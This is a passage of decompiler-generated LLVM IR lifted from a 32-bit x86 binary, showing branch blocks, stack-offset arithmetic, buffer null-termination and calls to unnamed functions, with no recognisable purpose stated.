  store i32 %v3_8049550, i32* %edx.global-to-local, align 4
  %v2_8049554 = sub i32 %v3_80495d1, %v1_8049554
  store i32 %v2_8049554, i32* %eax.global-to-local, align 4
  %v2_8049556 = add i32 %v3_8049550, 12
  %v3_8049556 = inttoptr i32 %v2_8049556 to i32*
  store i32 %v2_8049554, i32* %v3_8049556, align 4
  %v0_8049559 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049559 = inttoptr i32 %v0_8049559 to i32*
  %v2_8049559 = load i32, i32* %v1_8049559, align 4
  %v11_8049559 = icmp eq i32 %v2_8049559, 1
  store i1 %v11_8049559, i1* %zf.global-to-local, align 1
  br i1 %v11_8049559, label %dec_label_pc_8049636, label %dec_label_pc_8049562

dec_label_pc_8049562:                             ; preds = %dec_label_pc_8049550, %dec_label_pc_8049636, %dec_label_pc_80495dc
  %v0_8049562 = load i32, i32* @esp, align 4
  %v1_8049562 = add i32 %v0_8049562, 92
  %v2_8049562 = inttoptr i32 %v1_8049562 to i32*
  %v3_8049562 = load i32, i32* %v2_8049562, align 4
  store i32 %v3_8049562, i32* %ecx.global-to-local, align 4
  %v1_8049566 = add i32 %v3_8049562, 12
  %v2_8049566 = inttoptr i32 %v1_8049566 to i32*
  %v3_8049566 = load i32, i32* %v2_8049566, align 4
  store i32 %v3_8049566, i32* %eax.global-to-local, align 4
  %v1_8049569 = icmp eq i32 %v3_8049566, 0
  store i1 %v1_8049569, i1* %zf.global-to-local, align 1
  %v1_804956b = icmp eq i1 %v1_8049569, false
  br i1 %v1_804956b, label %dec_label_pc_804958e, label %dec_label_pc_804956d

dec_label_pc_804956d:                             ; preds = %dec_label_pc_8049562
  %v1_804956d = add i32 %v3_8049562, 8
  %v2_804956d = inttoptr i32 %v1_804956d to i32*
  %v3_804956d = load i32, i32* %v2_804956d, align 4
  %v12_804956d = icmp eq i32 %v3_804956d, 1
  store i1 %v12_804956d, i1* %zf.global-to-local, align 1
  br i1 %v12_804956d, label %dec_label_pc_80496da, label %dec_label_pc_8049577

dec_label_pc_8049577:                             ; preds = %dec_label_pc_804956d
  %v3_8049577 = load i32, i32* %v2_8049562, align 4
  store i32 %v3_8049577, i32* %ecx.global-to-local, align 4
  %v1_804957b = add i32 %v3_8049577, 660
  %v2_804957b = inttoptr i32 %v1_804957b to i32*
  %v3_804957b = load i32, i32* %v2_804957b, align 4
  %v1_8049581 = load i32, i32* @ebx, align 4
  %v2_8049581 = sub i32 %v3_804957b, %v1_8049581
  %v12_8049581 = icmp eq i32 %v2_8049581, 0
  store i32 %v2_8049581, i32* %eax.global-to-local, align 4
  %v2_8049583 = add i32 %v3_8049577, 12
  %v3_8049583 = inttoptr i32 %v2_8049583 to i32*
  store i32 %v2_8049581, i32* %v3_8049583, align 4
  store i1 %v12_8049581, i1* %zf.global-to-local, align 1
  br i1 %v12_8049581, label %dec_label_pc_8049af8, label %dec_label_pc_804958e

dec_label_pc_804958e:                             ; preds = %dec_label_pc_8049577, %dec_label_pc_8049562, %dec_label_pc_80496da, %dec_label_pc_8049764
  %v0_804958e = load i32, i32* @ebx, align 4
  %v1_804958e = icmp eq i32 %v0_804958e, 0
  store i1 %v1_804958e, i1* %zf.global-to-local, align 1
  br i1 %v1_804958e, label %dec_label_pc_80495e0, label %dec_label_pc_8049592

dec_label_pc_8049592:                             ; preds = %dec_label_pc_804958e
  %v0_8049592 = load i32, i32* @esp, align 4
  %v1_8049592 = add i32 %v0_8049592, 92
  %v2_8049592 = inttoptr i32 %v1_8049592 to i32*
  %v3_8049592 = load i32, i32* %v2_8049592, align 4
  store i32 %v3_8049592, i32* %edx.global-to-local, align 4
  %v1_8049596 = add i32 %v3_8049592, 660
  %v2_8049596 = inttoptr i32 %v1_8049596 to i32*
  %v3_8049596 = load i32, i32* %v2_8049596, align 4
  %v2_804959c = sub i32 %v3_8049596, %v0_804958e
  %v12_804959c = icmp eq i32 %v2_804959c, 0
  store i1 %v12_804959c, i1* %zf.global-to-local, align 1
  store i32 %v2_804959c, i32* %eax.global-to-local, align 4
  store i32 %v2_804959c, i32* %v2_8049596, align 4
  %v0_80495a4 = load i32, i32* %edx.global-to-local, align 4
  %v1_80495a4 = load i32, i32* @esp, align 4
  %v2_80495a4 = add i32 %v1_80495a4, -4
  %v3_80495a4 = inttoptr i32 %v2_80495a4 to i32*
  store i32 %v0_80495a4, i32* %v3_80495a4, align 4
  %v0_80495a5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80495a5 = add i32 %v1_80495a4, -8
  %v3_80495a5 = inttoptr i32 %v2_80495a5 to i32*
  store i32 %v0_80495a5, i32* %v3_80495a5, align 4
  %v0_80495a6 = load i32, i32* @esi, align 4
  %v1_80495a6 = load i32, i32* @ebx, align 4
  %v2_80495a6 = add i32 %v1_80495a6, %v0_80495a6
  store i32 %v2_80495a6, i32* %eax.global-to-local, align 4
  %v2_80495a9 = add i32 %v1_80495a4, -12
  %v3_80495a9 = inttoptr i32 %v2_80495a9 to i32*
  store i32 %v2_80495a6, i32* %v3_80495a9, align 4
  %v0_80495aa = load i32, i32* @esi, align 4
  %v2_80495aa = add i32 %v1_80495a4, -16
  %v3_80495aa = inttoptr i32 %v2_80495aa to i32*
  store i32 %v0_80495aa, i32* %v3_80495aa, align 4
  %v4_80495ab = call i32 @function_8052743(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80495ab, i32* %eax.global-to-local, align 4
  %v0_80495b0 = load i32, i32* @esp, align 4
  %v1_80495b0 = add i32 %v0_80495b0, 108
  %v2_80495b0 = inttoptr i32 %v1_80495b0 to i32*
  %v3_80495b0 = load i32, i32* %v2_80495b0, align 4
  store i32 %v3_80495b0, i32* %ecx.global-to-local, align 4
  %v1_80495b4 = add i32 %v0_80495b0, 92
  %v2_80495b4 = inttoptr i32 %v1_80495b4 to i32*
  %v3_80495b4 = load i32, i32* %v2_80495b4, align 4
  store i32 %v3_80495b4, i32* %edx.global-to-local, align 4
  %v1_80495b8 = add i32 %v3_80495b0, 660
  %v2_80495b8 = inttoptr i32 %v1_80495b8 to i32*
  %v3_80495b8 = load i32, i32* %v2_80495b8, align 4
  store i32 %v3_80495b8, i32* %eax.global-to-local, align 4
  %v1_80495c1 = icmp eq i32 %v3_80495b8, 0
  store i1 %v1_80495c1, i1* %zf.global-to-local, align 1
  %v2_80495c3 = add i32 %v3_80495b4, 2116
  %v3_80495c3 = add i32 %v2_80495c3, %v3_80495b8
  %v4_80495c3 = inttoptr i32 %v3_80495c3 to i8*
  store i8 0, i8* %v4_80495c3, align 1
  %v0_80495cb = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80495cb, label %dec_label_pc_80495e0, label %dec_label_pc_80495cd

dec_label_pc_80495cd:                             ; preds = %dec_label_pc_8049592
  %v0_80495cd = load i32, i32* @esp, align 4
  %v1_80495cd = add i32 %v0_80495cd, 92
  %v2_80495cd = inttoptr i32 %v1_80495cd to i32*
  %v3_80495cd = load i32, i32* %v2_80495cd, align 4
  store i32 %v3_80495cd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80495d1

dec_label_pc_80495d1:                             ; preds = %dec_label_pc_8049521, %dec_label_pc_80495cd
  %v0_8049542 = phi i32 [ %v0_80495d1.pre, %dec_label_pc_8049521 ], [ %v3_80495cd, %dec_label_pc_80495cd ]
  %v1_80495d1 = add i32 %v0_8049542, 12
  %v2_80495d1 = inttoptr i32 %v1_80495d1 to i32*
  %v3_80495d1 = load i32, i32* %v2_80495d1, align 4
  store i32 %v3_80495d1, i32* %eax.global-to-local, align 4
  %v1_80495d4 = icmp eq i32 %v3_80495d1, 0
  store i1 %v1_80495d4, i1* %zf.global-to-local, align 1
  %tmp145 = icmp slt i32 %v3_80495d1, 1
  %tmp146 = icmp eq i1 %tmp145, false
  br i1 %tmp146, label %dec_label_pc_8049542, label %dec_label_pc_80495dc

dec_label_pc_80495dc:                             ; preds = %dec_label_pc_80495d1
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8049562

dec_label_pc_80495e0:                             ; preds = %dec_label_pc_8049592, %dec_label_pc_804958e
  %v0_80495e0 = load i32, i32* @esp, align 4
  %v1_80495e0 = add i32 %v0_80495e0, 92
  %v2_80495e0 = inttoptr i32 %v1_80495e0 to i32*
  %v3_80495e0 = load i32, i32* %v2_80495e0, align 4
  store i32 %v3_80495e0, i32* %eax.global-to-local, align 4
  %v1_80495e4 = add i32 %v3_80495e0, -1448
  %v2_80495e4 = inttoptr i32 %v1_80495e4 to i8*
  %v3_80495e4 = load i8, i8* %v2_80495e4, align 1
  %v12_80495e4 = icmp eq i8 %v3_80495e4, 7
  store i1 %v12_80495e4, i1* %zf.global-to-local, align 1
  %v1_80495eb = icmp eq i1 %v12_80495e4, false
  br i1 %v1_80495eb, label %dec_label_pc_8048d91, label %dec_label_pc_80495f1

dec_label_pc_80495f1:                             ; preds = %dec_label_pc_80495e0
  %v3_80495f1 = load i32, i32* %v2_80495e0, align 4
  store i32 %v3_80495f1, i32* %edx.global-to-local, align 4
  %v1_80495f5 = add i32 %v3_80495f1, 660
  %v2_80495f5 = inttoptr i32 %v1_80495f5 to i32*
  %v3_80495f5 = load i32, i32* %v2_80495f5, align 4
  %v9_80495f5 = icmp eq i32 %v3_80495f5, 1024
  store i1 %v9_80495f5, i1* %zf.global-to-local, align 1
  %v1_80495ff = icmp eq i1 %v9_80495f5, false
  br i1 %v1_80495ff, label %dec_label_pc_80494dc, label %dec_label_pc_8049605

dec_label_pc_8049605:                             ; preds = %dec_label_pc_80495f1, %dec_label_pc_80494af
  %v1_8049605 = phi i32 [ %v0_80494b4, %dec_label_pc_80494af ], [ %v0_80495e0, %dec_label_pc_80495f1 ]
  %v0_8049605 = phi i32 [ %v1_80494af, %dec_label_pc_80494af ], [ %v3_80495e0, %dec_label_pc_80495f1 ]
  %v2_8049605 = add i32 %v1_8049605, -4
  %v3_8049605 = inttoptr i32 %v2_8049605 to i32*
  store i32 %v0_8049605, i32* %v3_8049605, align 4
  %v1_8049606 = add i32 %v1_8049605, -8
  %v2_8049606 = inttoptr i32 %v1_8049606 to i32*
  store i32 960, i32* %v2_8049606, align 4
  %v1_804960b = add i32 %v1_8049605, 76
  %v2_804960b = inttoptr i32 %v1_804960b to i32*
  %v3_804960b = load i32, i32* %v2_804960b, align 4
  %v1_804960f = add i32 %v3_804960b, 2180
  %v9_804960f = icmp eq i32 %v1_804960f, 0
  store i1 %v9_804960f, i1* %zf.global-to-local, align 1
  store i32 %v1_804960f, i32* %eax.global-to-local, align 4
  %v2_8049614 = add i32 %v1_8049605, -12
  %v3_8049614 = inttoptr i32 %v2_8049614 to i32*
  store i32 %v1_804960f, i32* %v3_8049614, align 4
  %v0_8049615 = load i32, i32* @esi, align 4
  %v2_8049615 = add i32 %v1_8049605, -16
  %v3_8049615 = inttoptr i32 %v2_8049615 to i32*
  store i32 %v0_8049615, i32* %v3_8049615, align 4
  %v4_8049616 = call i32 @function_8052743(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049616, i32* %eax.global-to-local, align 4
  %v0_804961b = load i32, i32* @esp, align 4
  %v1_804961b = add i32 %v0_804961b, 108
  %v2_804961b = inttoptr i32 %v1_804961b to i32*
  %v3_804961b = load i32, i32* %v2_804961b, align 4
  store i32 %v3_804961b, i32* %ecx.global-to-local, align 4
  %v1_804961f = add i32 %v3_804961b, 660
  %v2_804961f = inttoptr i32 %v1_804961f to i32*
  %v3_804961f = load i32, i32* %v2_804961f, align 4
  %v1_8049628 = add i32 %v3_804961f, -64
  %v6_8049628 = icmp eq i32 %v1_8049628, 0
  store i1 %v6_8049628, i1* %zf.global-to-local, align 1
  store i32 %v1_8049628, i32* %eax.global-to-local, align 4
  store i32 %v1_8049628, i32* %v2_804961f, align 4
  %v0_80494dc.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80494dc

dec_label_pc_8049636:                             ; preds = %dec_label_pc_8049550
  %v0_8049636 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049636 = load i32, i32* @esp, align 4
  %v2_8049636 = add i32 %v1_8049636, -4
  %v3_8049636 = inttoptr i32 %v2_8049636 to i32*
  store i32 %v0_8049636, i32* %v3_8049636, align 4
  %v0_8049637 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049637 = add i32 %v1_8049636, -8
  %v3_8049637 = inttoptr i32 %v2_8049637 to i32*
  store i32 %v0_8049637, i32* %v3_8049637, align 4
  %v1_8049638 = add i32 %v1_8049636, -12
  %v2_8049638 = inttoptr i32 %v1_8049638 to i32*
  store i32 0, i32* %v2_8049638, align 4
  %v1_804963a = add i32 %v1_8049636, -16
  %v2_804963a = inttoptr i32 %v1_804963a to i32*
  store i32 36, i32* %v2_804963a, align 4
  %v3_804963c = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804963c, i32* %eax.global-to-local, align 4
  %v0_8049641 = load i32, i32* @esp, align 4
  %v1_8049641 = add i32 %v0_8049641, -4
  %v2_8049641 = inttoptr i32 %v1_8049641 to i32*
  store i32 11, i32* %v2_8049641, align 4
  %v2_8049643 = add i32 %v0_8049641, -8
  %v3_8049643 = inttoptr i32 %v2_8049643 to i32*
  store i32 %v3_804963c, i32* %v3_8049643, align 4
  %v1_8049644 = add i32 %v0_8049641, 108
  %v2_8049644 = inttoptr i32 %v1_8049644 to i32*
  %v3_8049644 = load i32, i32* %v2_8049644, align 4
  store i32 %v3_8049644, i32* %ecx.global-to-local, align 4
  %v1_8049648 = add i32 %v3_8049644, 660
  %v2_8049648 = inttoptr i32 %v1_8049648 to i32*
  %v3_8049648 = load i32, i32* %v2_8049648, align 4
  store i32 %v3_8049648, i32* %eax.global-to-local, align 4
  %v2_804964e = add i32 %v0_8049641, -12
  %v3_804964e = inttoptr i32 %v2_804964e to i32*
  store i32 %v3_8049648, i32* %v3_804964e, align 4
  %v0_804964f = load i32, i32* @esi, align 4
  %v2_804964f = add i32 %v0_8049641, -16
  %v3_804964f = inttoptr i32 %v2_804964f to i32*
  store i32 %v0_804964f, i32* %v3_804964f, align 4
  %v0_8049650 = call i32 @function_8051cf0()
  %v0_8049655 = load i32, i32* @esp, align 4
  %v1_8049658 = add i32 %v0_8049650, 1
  %v8_8049658 = icmp eq i32 %v1_8049658, 0
  store i1 %v8_8049658, i1* %zf.global-to-local, align 1
  store i32 %v1_8049658, i32* %eax.global-to-local, align 4
  br i1 %v8_8049658, label %dec_label_pc_8049562, label %dec_label_pc_804965f

dec_label_pc_804965f:                             ; preds = %dec_label_pc_8049636
  %v2_804965f = add i32 %v0_8049655, 28
  %v3_804965f = inttoptr i32 %v2_804965f to i32*
  store i32 %v1_8049658, i32* %v3_804965f, align 4
  %v0_8049660 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049660 = add i32 %v0_8049655, 24
  %v3_8049660 = inttoptr i32 %v2_8049660 to i32*
  store i32 %v0_8049660, i32* %v3_8049660, align 4
  %v1_8049661 = add i32 %v0_8049655, 20
  %v2_8049661 = inttoptr i32 %v1_8049661 to i32*
  store i32 0, i32* %v2_8049661, align 4
  %v1_8049663 = add i32 %v0_8049655, 16
  %v2_8049663 = inttoptr i32 %v1_8049663 to i32*
  store i32 36, i32* %v2_8049663, align 4
  %v3_8049665 = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049665, i32* %eax.global-to-local, align 4
  %v0_804966a = load i32, i32* @esp, align 4
  %v1_804966a = add i32 %v0_804966a, -4
  %v2_804966a = inttoptr i32 %v1_804966a to i32*
  store i32 11, i32* %v2_804966a, align 4
  %v2_804966c = add i32 %v0_804966a, -8
  %v3_804966c = inttoptr i32 %v2_804966c to i32*
  store i32 %v3_8049665, i32* %v3_804966c, align 4
  %v1_804966d = add i32 %v0_804966a, 108
  %v2_804966d = inttoptr i32 %v1_804966d to i32*
  %v3_804966d = load i32, i32* %v2_804966d, align 4
  store i32 %v3_804966d, i32* %eax.global-to-local, align 4
  %v1_8049671 = add i32 %v3_804966d, 660
  %v2_8049671 = inttoptr i32 %v1_8049671 to i32*
  %v3_8049671 = load i32, i32* %v2_8049671, align 4
  store i32 %v3_8049671, i32* %eax.global-to-local, align 4
  %v2_8049677 = add i32 %v0_804966a, -12
  %v3_8049677 = inttoptr i32 %v2_8049677 to i32*
  store i32 %v3_8049671, i32* %v3_8049677, align 4
  %v0_8049678 = load i32, i32* @esi, align 4
  %v2_8049678 = add i32 %v0_804966a, -16
  %v3_8049678 = inttoptr i32 %v2_8049678 to i32*
  store i32 %v0_8049678, i32* %v3_8049678, align 4
  %v0_8049679 = call i32 @function_8051cf0()
  store i32 %v0_8049679, i32* %eax.global-to-local, align 4
  %v0_804967e = load i32, i32* @esp, align 4
  %v1_8049681 = add i32 %v0_804967e, 28
  %v2_8049681 = inttoptr i32 %v1_8049681 to i32*
  store i32 1, i32* %v2_8049681, align 4
  %v1_8049683 = add i32 %v0_804967e, 24
  %v2_8049683 = inttoptr i32 %v1_8049683 to i32*
  store i32 ptrtoint (i32* @global_var_8054b1a.16 to i32), i32* %v2_8049683, align 4
  %v1_8049688 = add i32 %v0_804967e, 124
  %v2_8049688 = inttoptr i32 %v1_8049688 to i32*
  %v3_8049688 = load i32, i32* %v2_8049688, align 4
  store i32 %v3_8049688, i32* %edx.global-to-local, align 4
  store i32 %v0_8049679, i32* @ebx, align 4
  %v0_804968e = load i32, i32* @esi, align 4
  %v2_804968e = add i32 %v0_804968e, %v0_8049679
  store i32 %v2_804968e, i32* @edi, align 4
  %v1_8049691 = add i32 %v3_8049688, 660
  %v2_8049691 = inttoptr i32 %v1_8049691 to i32*
  %v3_8049691 = load i32, i32* %v2_8049691, align 4
  %v2_8049697 = sub i32 %v3_8049691, %v0_8049679
  %v12_8049697 = icmp eq i32 %v2_8049697, 0
  store i1 %v12_8049697, i1* %zf.global-to-local, align 1
  store i32 %v2_8049697, i32* %eax.global-to-local, align 4
  %v2_8049699 = add i32 %v0_804967e, 20
  %v3_8049699 = inttoptr i32 %v2_8049699 to i32*
  store i32 %v2_8049697, i32* %v3_8049699, align 4
  %v0_804969a = load i32, i32* @edi, align 4
  %v2_804969a = add i32 %v0_804967e, 16
  %v3_804969a = inttoptr i32 %v2_804969a to i32*
  store i32 %v0_804969a, i32* %v3_804969a, align 4
  %v0_804969b = call i32 @function_8051cf0()
  store i32 %v0_804969b, i32* %eax.global-to-local, align 4
  %v0_80496a0 = load i32, i32* @esp, align 4
  %v1_80496a0 = add i32 %v0_80496a0, 92
  %v2_80496a0 = inttoptr i32 %v1_80496a0 to i32*
  %v3_80496a0 = load i32, i32* %v2_80496a0, align 4
  store i32 %v3_80496a0, i32* %ecx.global-to-local, align 4
  %v0_80496a4 = load i32, i32* @ebx, align 4
  %v2_80496a4 = add i32 %v0_80496a4, %v0_804969b
  store i32 %v2_80496a4, i32* @ebx, align 4
  %v2_80496a6 = add i32 %v0_80496a0, 56
  %v3_80496a6 = inttoptr i32 %v2_80496a6 to i32*
  store i32 %v2_80496a4, i32* %v3_80496a6, align 4
  %v0_80496ad = load i32, i32* @ebx, align 4
  %v1_80496ad = load i32, i32* %ecx.global-to-local, align 4
  %v2_80496ad = add i32 %v0_80496ad, 2115
  %v3_80496ad = add i32 %v2_80496ad, %v1_80496ad
  %v4_80496ad = inttoptr i32 %v3_80496ad to i8*
  store i8 0, i8* %v4_80496ad, align 1
  %v0_80496b5 = load i32, i32* @esp, align 4
  %v1_80496b5 = add i32 %v0_80496b5, 92
  %v2_80496b5 = inttoptr i32 %v1_80496b5 to i32*
  %v3_80496b5 = load i32, i32* %v2_80496b5, align 4
  store i32 %v3_80496b5, i32* %eax.global-to-local, align 4
  %v1_80496b9 = add i32 %v3_80496b5, 16
  %v2_80496b9 = inttoptr i32 %v1_80496b9 to i32*
  %v3_80496b9 = load i32, i32* %v2_80496b9, align 4
  %v4_80496b9 = add i32 %v3_80496b9, -4
  %v9_80496b9 = sub i32 3, %v3_80496b9
  %v10_80496b9 = and i32 %v9_80496b9, %v3_80496b9
  %v11_80496b9 = icmp slt i32 %v10_80496b9, 0
  %v12_80496b9 = icmp eq i32 %v4_80496b9, 0
  store i1 %v12_80496b9, i1* %zf.global-to-local, align 1
  %v13_80496b9 = icmp slt i32 %v4_80496b9, 0
  %v3_80496bd = icmp ne i1 %v13_80496b9, %v11_80496b9
  %v4_80496bd = or i1 %v12_80496b9, %v3_80496bd
  br i1 %v4_80496bd, label %dec_label_pc_8049da3, label %dec_label_pc_80496c3

dec_label_pc_80496c3:                             ; preds = %dec_label_pc_8049da3, %dec_label_pc_804965f, %dec_label_pc_8049db8
  %v0_80496c3 = phi i32 [ %v1_8049dac, %dec_label_pc_8049da3 ], [ %v0_80496b5, %dec_label_pc_804965f ], [ %v0_80496c3.pre, %dec_label_pc_8049db8 ]
  %v1_80496c3 = add i32 %v0_80496c3, 92
  %v2_80496c3 = inttoptr i32 %v1_80496c3 to i32*
  %v3_80496c3 = load i32, i32* %v2_80496c3, align 4
  store i32 %v3_80496c3, i32* %edx.global-to-local, align 4
  %v1_80496c7 = add i32 %v3_80496c3, 12
  %v2_80496c7 = inttoptr i32 %v1_80496c7 to i32*
  store i32 -1, i32* %v2_80496c7, align 4
  %v0_80496ce = load i32, i32* %edx.global-to-local, align 4
  %v1_80496ce = add i32 %v0_80496ce, -1448
  %v2_80496ce = inttoptr i32 %v1_80496ce to i8*
  store i8 10, i8* %v2_80496ce, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_80496da:                             ; preds = %dec_label_pc_804956d
  %v1_80496da = add i32 %v0_8049562, -4
  %v2_80496da = inttoptr i32 %v1_80496da to i32*
  store i32 2, i32* %v2_80496da, align 4
  %v1_80496dc = add i32 %v0_8049562, -8
  %v2_80496dc = inttoptr i32 %v1_80496dc to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v2_80496dc, align 4
  %v0_80496e1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80496e1 = add i32 %v0_80496e1, 660
  %v2_80496e1 = inttoptr i32 %v1_80496e1 to i32*
  %v3_80496e1 = load i32, i32* %v2_80496e1, align 4
  store i32 %v3_80496e1, i32* %eax.global-to-local, align 4
  %v2_80496e7 = add i32 %v0_8049562, -12
  %v3_80496e7 = inttoptr i32 %v2_80496e7 to i32*
  store i32 %v3_80496e1, i32* %v3_80496e7, align 4
  %v0_80496e8 = load i32, i32* @esi, align 4
  %v2_80496e8 = add i32 %v0_8049562, -16
  %v3_80496e8 = inttoptr i32 %v2_80496e8 to i32*
  store i32 %v0_80496e8, i32* %v3_80496e8, align 4
  %v0_80496e9 = call i32 @function_8051cf0()
  %v0_80496ee = load i32, i32* @esp, align 4
  %v1_80496f1 = add i32 %v0_80496e9, 1
  %v8_80496f1 = icmp eq i32 %v1_80496f1, 0
  store i1 %v8_80496f1, i1* %zf.global-to-local, align 1
  store i32 %v1_80496f1, i32* %eax.global-to-local, align 4
  br i1 %v8_80496f1, label %dec_label_pc_804958e, label %dec_label_pc_80496f8

dec_label_pc_80496f8:                             ; preds = %dec_label_pc_80496da
  %v1_80496f8 = add i32 %v0_80496ee, 12
  %v2_80496f8 = inttoptr i32 %v1_80496f8 to i32*
  store i32 2, i32* %v2_80496f8, align 4
  %v1_80496fa = add i32 %v0_80496ee, 8
  %v2_80496fa = inttoptr i32 %v1_80496fa to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v2_80496fa, align 4
  %v1_80496ff = add i32 %v0_80496ee, 108
  %v2_80496ff = inttoptr i32 %v1_80496ff to i32*
  %v3_80496ff = load i32, i32* %v2_80496ff, align 4
  store i32 %v3_80496ff, i32* %eax.global-to-local, align 4
  %v1_8049703 = add i32 %v3_80496ff, 660
  %v2_8049703 = inttoptr i32 %v1_8049703 to i32*
  %v3_8049703 = load i32, i32* %v2_8049703, align 4
  %v2_8049709 = add i32 %v0_80496ee, 4
  %v3_8049709 = inttoptr i32 %v2_8049709 to i32*
  store i32 %v3_8049703, i32* %v3_8049709, align 4
  %v0_804970a = load i32, i32* @esi, align 4
  %v3_804970a = inttoptr i32 %v0_80496ee to i32*
  store i32 %v0_804970a, i32* %v3_804970a, align 4
  %v0_804970b = call i32 @function_8051cf0()
  store i32 %v0_804970b, i32* %eax.global-to-local, align 4
  %v0_8049710 = load i32, i32* @esp, align 4
  %v1_8049710 = add i32 %v0_8049710, 92
  %v2_8049710 = inttoptr i32 %v1_8049710 to i32*
  %v3_8049710 = load i32, i32* %v2_8049710, align 4
  store i32 %v3_8049710, i32* %edx.global-to-local, align 4
  store i32 %v0_804970b, i32* @ebx, align 4
  %v2_8049716 = add i32 %v0_804970b, 2114
  %v3_8049716 = add i32 %v2_8049716, %v3_8049710
  %v4_8049716 = inttoptr i32 %v3_8049716 to i8*
  store i8 0, i8* %v4_8049716, align 1
  %v0_804971e = load i32, i32* @esp, align 4
  %v1_804971e = add i32 %v0_804971e, -4
  %v2_804971e = inttoptr i32 %v1_804971e to i32*
  store i32 1, i32* %v2_804971e, align 4
  %v1_8049720 = add i32 %v0_804971e, -8
  %v2_8049720 = inttoptr i32 %v1_8049720 to i32*
  store i32 ptrtoint (i32* @global_var_8054b09.14 to i32), i32* %v2_8049720, align 4
  %v2_8049725 = add i32 %v0_804971e, -12
  %v3_8049725 = inttoptr i32 %v2_8049725 to i32*
  store i32 %v0_804970b, i32* %v3_8049725, align 4
  %v0_8049726 = load i32, i32* @esi, align 4
  %v2_8049726 = add i32 %v0_804971e, -16
  %v3_8049726 = inttoptr i32 %v2_8049726 to i32*
  store i32 %v0_8049726, i32* %v3_8049726, align 4
  %v0_8049727 = call i32 @function_8051cf0()
  %v0_804972c = load i32, i32* @esp, align 4
  %v1_804972c = add i32 %v0_804972c, 32
  %v1_804972f = add i32 %v0_8049727, 1
  %v8_804972f = icmp eq i32 %v1_804972f, 0
  store i1 %v8_804972f, i1* %zf.global-to-local, align 1
  store i32 %v1_804972f, i32* %eax.global-to-local, align 4
  br i1 %v8_804972f, label %dec_label_pc_804974f, label %dec_label_pc_8049732

dec_label_pc_8049732:                             ; preds = %dec_label_pc_80496f8
  %v1_8049732 = add i32 %v0_804972c, 28
  %v2_8049732 = inttoptr i32 %v1_8049732 to i32*
  store i32 1, i32* %v2_8049732, align 4
  %v1_8049734 = add i32 %v0_804972c, 24
  %v2_8049734 = inttoptr i32 %v1_8049734 to i32*
  store i32 ptrtoint (i32* @global_var_8054b09.14 to i32), i32* %v2_8049734, align 4
  %v0_8049739 = load i32, i32* @ebx, align 4
  %v2_8049739 = add i32 %v0_804972c, 20
  %v3_8049739 = inttoptr i32 %v2_8049739 to i32*
  store i32 %v0_8049739, i32* %v3_8049739, align 4
  %v0_804973a = load i32, i32* @esi, align 4
  %v2_804973a = add i32 %v0_804972c, 16
  %v3_804973a = inttoptr i32 %v2_804973a to i32*
  store i32 %v0_804973a, i32* %v3_804973a, align 4
  %v0_804973b = call i32 @function_8051cf0()
  store i32 %v0_804973b, i32* %eax.global-to-local, align 4
  %v0_8049740 = load i32, i32* @esp, align 4
  %v1_8049740 = add i32 %v0_8049740, 92
  %v2_8049740 = inttoptr i32 %v1_8049740 to i32*
  %v3_8049740 = load i32, i32* %v2_8049740, align 4
  store i32 %v3_8049740, i32* @ecx, align 4
  %v6_8049744 = icmp eq i32 %v0_8049740, -16
  store i1 %v6_8049744, i1* %zf.global-to-local, align 1
  %v2_8049747 = add i32 %v0_804973b, 2116
  %v3_8049747 = add i32 %v2_8049747, %v3_8049740
  %v4_8049747 = inttoptr i32 %v3_8049747 to i8*
  store i8 0, i8* %v4_8049747, align 1
  %v1_804974f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804974f

dec_label_pc_804974f:                             ; preds = %dec_label_pc_80496f8, %dec_label_pc_8049732
  %v1_804974f = phi i32 [ %v1_804972c, %dec_label_pc_80496f8 ], [ %v1_804974f.pre, %dec_label_pc_8049732 ]
  %v0_804974f = load i32, i32* @ecx, align 4
  %v2_804974f = add i32 %v1_804974f, -4
  %v3_804974f = inttoptr i32 %v2_804974f to i32*
  store i32 %v0_804974f, i32* %v3_804974f, align 4
  %v0_8049750 = load i32, i32* @ecx, align 4
  %v2_8049750 = add i32 %v1_804974f, -8
  %v3_8049750 = inttoptr i32 %v2_8049750 to i32*
  store i32 %v0_8049750, i32* %v3_8049750, align 4
  %v1_8049751 = add i32 %v1_804974f, -12
  %v2_8049751 = inttoptr i32 %v1_8049751 to i32*
  store i32 16, i32* %v2_8049751, align 4
  %v0_8049753 = load i32, i32* @esi, align 4
  %v2_8049753 = add i32 %v1_804974f, -16
  %v3_8049753 = inttoptr i32 %v2_8049753 to i32*
  store i32 %v0_8049753, i32* %v3_8049753, align 4
  %v3_8049754 = call i32 @function_8051d40(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049754, i32* %eax.global-to-local, align 4
  %v0_8049759 = load i32, i32* @esp, align 4
  %v1_804975c = icmp eq i32 %v3_8049754, 0
  store i1 %v1_804975c, i1* %zf.global-to-local, align 1
  %v1_8049e5a = add i32 %v0_8049759, 108
  %v2_8049e5a = inttoptr i32 %v1_8049e5a to i32*
  %v3_8049e5a = load i32, i32* %v2_8049e5a, align 4
  br i1 %v1_804975c, label %dec_label_pc_8049e5a, label %dec_label_pc_8049764

dec_label_pc_8049764:                             ; preds = %dec_label_pc_804974f
  store i32 %v3_8049e5a, i32* %edx.global-to-local, align 4
  %v1_8049768 = add i32 %v3_8049754, 2
